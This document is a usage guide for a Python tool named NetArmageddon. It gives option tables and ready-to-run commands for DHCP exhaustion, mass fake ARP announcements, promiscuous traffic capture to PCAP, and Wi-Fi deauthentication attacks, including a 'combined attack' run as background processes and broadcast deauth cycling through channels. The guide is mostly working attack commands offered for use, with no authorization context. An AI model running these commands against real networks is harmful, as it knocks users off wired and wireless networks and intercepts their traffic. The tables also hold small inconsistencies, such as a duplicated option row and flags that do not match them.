# NetArmageddon Usage Guide

## Command Reference
### DHCP Exhaustion
| Option | Description |
|--------|-------------|
| `-i/--interface` | Network interface (required) |
| `-n/--num-devices` | Number of devices to simulate (default: 50) |
| `-s/--client-src` | Custom MAC list |
| `-O/--request-options` | DHCP option codes |
| `-s/--client-src` | Comma-separated list of MAC addresses to cycle through |

### ARP Keep-Alive
| Option | Description |
|--------|-------------|
| `-i/--interface` | Network interface (required) |
| `-b/--base-ip` | Base IP address (e.g., 192.168.1.) |
| `-n/--num-devices` | Devices to maintain (default: 50) |
| `-t/--interval` | Announcement interval (default: 5) |
| `-c/ --cycles` | Number of ARP announcement cycles to perform (default: 1) |

### Traffic Capture
| Option               | Description                                            |
|----------------------|--------------------------------------------------------|
| `-i, --interface`    | Network interface to capture on (e.g. `eth0`)         |
| `-f, --filter`       | BPF filter expression (default: tcp port 80)    |
| `-o, --output`       | Output PCAP filename (e.g. `capture.pcap`)            |
| `-d, --duration`     | Capture duration in seconds (0 = run until stopped)   |
| `-c, --count`        | Max packets to capture (0 = unlimited)                |
| `-s, --snaplen`      | Snapshot length (bytes per packet; default: 0)    |
| `-p, --promisc`      | Enable promiscuous mode on the interface (default: True) |

### Deauthentication Attack
| Option                         | Description                                                                 |
|--------------------------------|-----------------------------------------------------------------------------|
| `-i, --interface`             | Wireless interface (monitor mode required)                                  |
| `-c, --clients`               | Comma-separated list of client MACs to target (default: broadcast)         |
| `-s, --skip-monitormode`          | Assume interface already in monitor mode (skip setup)                      |
| `-k, --kill`                  | Kill NetworkManager before starting attack                                 |
| `-d, --deauth-all-channels`   | Cycle through all supported channels for broadcast deauth                  |
| `-C, --Channels`              | Comma-separated list of specific channels to target                        |
| `-S, --SSID`                      | Only attack APs matching the given SSID                                    |
| `-b, --BSSID`                     | Only attack AP with this specific BSSID                                    |
| `-a, --autostart`                 | Skip interactive selection when exactly one AP is found                     |
| `-D, --Debug`                     | Enable verbose debugging output                                             |


## Basic Commands

# DHCP Exhaustion (50 devices)
```
sudo python -m netarmageddon dhcp -i eth0 -n 50
```

# ARP Keep-Alive (192.168.1.x network)
```
sudo python -m netarmageddon arp -i eth0 -b 192.168.1.
```

# Combined attack (Background processes)
```
sudo python -m netarmageddon dhcp -i eth0 -n 100 &
sudo python -m netarmageddon arp -i eth0 -b 192.168.1. &
```
### DHCP Options
```
Specify which DHCP parameters to request using option codes:
```
# Request subnet mask (1), router (3), and DNS servers (6)
```
sudo python -m netarmageddon dhcp -i eth0 -O 1,3,6
```

# Request options 1-10 and 15
```
sudo python -m netarmageddon dhcp -i eth0 -O 1-10,15
```
## ARP Keep-Alive Options
# Custom MAC prefix and 10-second interval
```
sudo python -m netarmageddon arp -i eth0 -b 192.168.1. -n 100 -m "de:ad:00" -t 10
```

# Default settings (50 devices, 5s interval)
```
sudo python -m netarmageddon arp -i eth0 -b 10.0.0.
```

# Custom MAC prefix and 10 s interval
```
sudo python -m netarmageddon arp -i eth0 -b 192.168.1. -n 100  -m de:ad:00 -t 10 -c 1
```

# Multiple cycles
```
sudo python -m netarmageddon arp -i eth0 -b 10.0.0. -n 3 -m 02:00:00 -t 2.5 -c 2
```

## Traffic Capture

Capture live network traffic to a PCAP file:
```
sudo python -m netarmageddon traffic -i eth0 -f "tcp port 80" -o capture.pcap -d 60 -c 1000 -s 1514 --p True
```


## Deauthentication

# Broadcast deauth
```
sudo python -m netarmageddon deauth -i wlan0mon
```

# Target specific clients only, skip monitor setup, kill NetworkManager
```
sudo python -m netarmageddon deauth \
    -i wlan0mon \
    -c AA:BB:CC:DD:EE:FF,11:22:33:44:55:66 \
    --skip-monitormode \
    -k
```

# Cycle all channels with interactive AP selection
```
sudo python -m netarmageddon deauth \
    -i wlan0mon \
    --deauth-all-channels \
    --channels 1,6,11
```

## Safety Features
- Automatic rate limiting (max 100 packets/sec)
- Interface validation
- Input validation for MAC/IP formats
- Clean thread termination and graceful shutdown on CTRLC
